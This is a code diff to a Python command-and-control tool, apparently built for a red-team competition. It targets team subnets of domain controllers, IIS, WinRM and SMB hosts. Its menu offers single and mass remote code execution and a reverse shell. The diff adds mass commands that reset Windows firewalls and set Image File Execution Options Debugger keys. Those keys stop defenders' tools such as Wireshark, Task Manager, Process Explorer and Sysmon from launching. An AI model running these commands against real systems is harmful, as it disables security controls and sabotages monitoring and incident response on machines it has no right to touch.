@@ -40,80 +40,40 @@ ALL_HOSTS = [
     
     # Team 8
     "192.168.8.3", "192.168.8.4", "10.8.1.1", "10.8.1.2", "10.8.1.3",
-    
-    # Team 9
-    "192.168.9.3", "192.168.9.4", "10.9.1.1", "10.9.1.2", "10.9.1.3",
-    
-    # Team 10
-    "192.168.10.3", "192.168.10.4", "10.10.1.1", "10.10.1.2", "10.10.1.3",
-    
-    # Team 11
-    "192.168.11.3", "192.168.11.4", "10.11.1.1", "10.11.1.2", "10.11.1.3",
-    
-    # Team 12
-    "192.168.12.3", "192.168.12.4", "10.12.1.1", "10.12.1.2", "10.12.1.3",
-    
-    # Team 13
-    "192.168.13.3", "192.168.13.4", "10.13.1.1", "10.13.1.2", "10.13.1.3",
-    
-    # Team 14
-    "192.168.14.3", "192.168.14.4", "10.14.1.1", "10.14.1.2", "10.14.1.3",
-    
-    # Team 15
-    "192.168.15.3", "192.168.15.4", "10.15.1.1", "10.15.1.2", "10.15.1.3",
-    
-    # Team 16
-    "192.168.16.3", "192.168.16.4", "10.16.1.1", "10.16.1.2", "10.16.1.3",
-    
-    # Team 17
-    "192.168.17.3", "192.168.17.4", "10.17.1.1", "10.17.1.2", "10.17.1.3",
-    
-    # Team 18
-    "192.168.18.3", "192.168.18.4", "10.18.1.1", "10.18.1.2", "10.18.1.3",
 ]
 
 ALL_DC = [
     # Domain Controllers - typically the .1 addresses in 10.X.1. subnet
     "10.1.1.1", "10.2.1.1", "10.3.1.1", "10.4.1.1", "10.5.1.1",
-    "10.6.1.1", "10.7.1.1", "10.8.1.1", "10.9.1.1", "10.10.1.1",
-    "10.11.1.1", "10.12.1.1", "10.13.1.1", "10.14.1.1", "10.15.1.1",
-    "10.16.1.1", "10.17.1.1", "10.18.1.1",
-]
-
-ALL_IIS = [
-    # IIS Hosts - typically the 192.168.X.3 addresses
-    "192.168.1.3", "192.168.2.3", "192.168.3.3", "192.168.4.3", "192.168.5.3",
-    "192.168.6.3", "192.168.7.3", "192.168.8.3", "192.168.9.3", "192.168.10.3",
-    "192.168.11.3", "192.168.12.3", "192.168.13.3", "192.168.14.3", "192.168.15.3",
-    "192.168.16.3", "192.168.17.3", "192.168.18.3",
-]
-
-ALL_WINRM = [
-    # WinRM Hosts - typically the 192.168.X.4 addresses
-    "192.168.1.4", "192.168.2.4", "192.168.3.4", "192.168.4.4", "192.168.5.4",
-    "192.168.6.4", "192.168.7.4", "192.168.8.4", "192.168.9.4", "192.168.10.4",
-    "192.168.11.4", "192.168.12.4", "192.168.13.4", "192.168.14.4", "192.168.15.4",
-    "192.168.16.4", "192.168.17.4", "192.168.18.4",
-]
-
-ALL_ICMP = [
-    # ICMP Hosts - typically the 10.X.1.2 addresses
-    "10.1.1.2", "10.2.1.2", "10.3.1.2", "10.4.1.2", "10.5.1.2",
-    "10.6.1.2", "10.7.1.2", "10.8.1.2", "10.9.1.2", "10.10.1.2",
-    "10.11.1.2", "10.12.1.2", "10.13.1.2", "10.14.1.2", "10.15.1.2",
-    "10.16.1.2", "10.17.1.2", "10.18.1.2",
+    "10.6.1.1", "10.7.1.1", "10.8.1.1",
 ]
 
 ALL_SMB = [
-    # SMB Hosts - typically the 10.X.1.3 addresses
+    # SMB Hosts - typically the 192.168.X.3 addresses
+    "192.168.1.3", "192.168.2.3", "192.168.3.3", "192.168.4.3", "192.168.5.3",
+    "192.168.6.3", "192.168.7.3", "192.168.8.3",
+]
+
+ALL_IIS = [
+    # IIS Hosts - typically the 192.168.X.4 addresses
+    "192.168.1.4", "192.168.2.4", "192.168.3.4", "192.168.4.4", "192.168.5.4",
+    "192.168.6.4", "192.168.7.4", "192.168.8.4",
+]
+
+ALL_WINRM = [
+    # WinRM Hosts - typically the 10.X.1.2 addresses
+    "10.1.1.2", "10.2.1.2", "10.3.1.2", "10.4.1.2", "10.5.1.2",
+    "10.6.1.2", "10.7.1.2", "10.8.1.2",
+]
+
+ALL_ICMP = [
+    # ICMP Hosts - typically the 10.X.1.3 addresses
     "10.1.1.3", "10.2.1.3", "10.3.1.3", "10.4.1.3", "10.5.1.3",
-    "10.6.1.3", "10.7.1.3", "10.8.1.3", "10.9.1.3", "10.10.1.3",
-    "10.11.1.3", "10.12.1.3", "10.13.1.3", "10.14.1.3", "10.15.1.3",
-    "10.16.1.3", "10.17.1.3", "10.18.1.3",
+    "10.6.1.3", "10.7.1.3", "10.8.1.3",
 ]
 
 PORT = 8080
-TIMEOUT = 60
+TIMEOUT = 45
 CONCURRENCY = 8
 THROTTLE_MS = 50
 
@@ -306,6 +266,9 @@ def main_interface():
             Choice(value="SINGULAR", name="Singular Remote Code Execution"),
             Choice(value="MASS", name="Mass Remote Code Execution"),
             Choice(value="SHELL", name="Spawn a Reverse Shell"),
+            Choice(value="FIREWALL", name="Reset Firewalls"),
+            Choice(value="IFEO", name="Set IFEO Registry Keys"),
+            Choice(value="CALLBACK", name="Test Connections"),
             Choice(value=None, name="Exit"),
         ],
         default="SINGULAR",
@@ -684,7 +647,7 @@ def singular_execution():
         if not target:
             print("No target specified")
             return
-        
+
         # Check if target is in ALL_HOSTS
         if target not in ALL_HOSTS:
             print(f"❌ {target} is not a valid target IP")
@@ -777,17 +740,18 @@ def singular_execution():
     console.print(f"\n{double_line}")
     console.print(f"{double_line}")
 
-def mass_execution():
+def mass_execution(command=None):
     targets = choose_targets()
     if not targets:
         print("No targets selected")
         return
-    
-    command = inquirer.text(
-        message="Enter command to execute on all targets:",
-        style=text_style
-    ).execute()
-    
+
+    if command == None:
+        command = inquirer.text(
+            message="Enter command to execute on all targets:",
+            style=text_style
+        ).execute()
+
     if not command:
         print("No command entered")
         return
@@ -893,6 +857,15 @@ def main():
             mass_execution()
         elif action == "SHELL":
             shell_execution(selected_ip)
+        elif action == "FIREWALL":
+            command = "netsh advfirewall reset"
+            mass_execution(command)
+        elif action == "IFEO":
+            command = "for %i in (wireshark.exe taskmgr.exe autoruns.exe autoruns64.exe procexp.exe procexp64.exe procmon.exe procmon64.exe strings.exe strings64.exe Sysmon.exe Sysmon64.exe tcpview.exe tcpview64.exe) do @reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" /v Debugger /t REG_SZ /d \"conhost.exe\""
+            mass_execution(command)
+        elif action == "CALLBACK":
+            command = "rem"
+            mass_execution(command)
         else:
             print("Unknown action, returning to menu.")
         
